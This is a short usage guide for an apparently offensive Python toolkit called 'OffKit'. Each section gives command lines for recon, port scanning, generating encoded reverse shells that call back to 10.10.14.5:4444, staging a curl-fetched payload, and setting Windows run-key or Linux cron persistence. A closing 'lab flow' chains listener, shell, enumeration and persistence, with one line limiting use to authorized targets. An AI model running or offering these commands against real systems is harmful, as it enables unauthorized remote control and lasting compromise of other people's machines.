# OffKit usage

## recon
```bash
python3 offkit.py recon -t target.local --headers --ports --timeout 2
```

## scan
```bash
python3 offkit.py scan -t 10.10.10.10 -p 22,80,443,1-1024 -T 200
```

## shell
```bash
python3 offkit.py shell --list
python3 offkit.py shell -t reverse -H 10.10.14.5 -p 4444 --lang python --encode
python3 offkit.py shell -k nc_reverse_mkfifo -H 10.10.14.5 -p 4444 -o payload.txt
```

## payload
```bash
python3 offkit.py payload --list
python3 offkit.py payload -c bash_curl -H 10.10.14.5 -p 8000 -f stage.sh
```

## persist
```bash
python3 offkit.py persist --list
python3 offkit.py persist -t win_run_key -H 10.10.14.5 -f stage.ps1
```

## enum
```bash
python3 offkit.py enum --os all
python3 offkit.py enum --os linux --section Users
```

## listener
```bash
python3 offkit.py listener -p 4444
python3 offkit.py listener -p 4444 -i
```

## Lab flow

1. `python3 offkit.py listener -p 4444`
2. `python3 offkit.py shell -t reverse -H <ip> -p 4444 --lang bash`
3. Run payload on authorized target only
4. `python3 offkit.py enum --os linux`
5. `python3 offkit.py persist -t linux_cron -H <ip> -p 4444`
